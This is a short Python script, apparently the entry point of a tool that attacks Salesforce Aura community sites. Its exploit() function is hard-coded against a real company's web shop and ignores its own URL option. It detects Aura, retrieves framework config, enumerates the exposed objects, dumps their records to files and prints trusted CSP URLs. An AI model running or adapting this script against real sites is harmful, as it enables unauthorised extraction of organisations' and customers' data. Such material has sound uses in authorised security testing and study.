import sys
import optparse

from classes.SFAura import SFAura

from helpers.utils import create_folder_structure, save_data_in_file

def menu():
    parser = optparse.OptionParser()
    parser.add_option('-u', '--url', dest="url", help='ex: google.com')

    options, args = parser.parse_args()
    globals().update(locals())

def exploit():
    target = "https://shop.latch.com"

    url = SFAura(target)
    folder = create_folder_structure(target)

    is_salesforce = url.is_salesforce_aura()

    if not is_salesforce:
        sys.exit("The provided url is not using salesforce solution")

    url.retrive_fwuid()

    config_data = url.get_config_data()

    objects = url.get_objects(config_data)

    save_data_in_file(path=folder, filename="objects", data=str(objects))

    url.get_objects_items(objects)

    print(url.get_csp_trusted_urls(config_data))

menu()
exploit()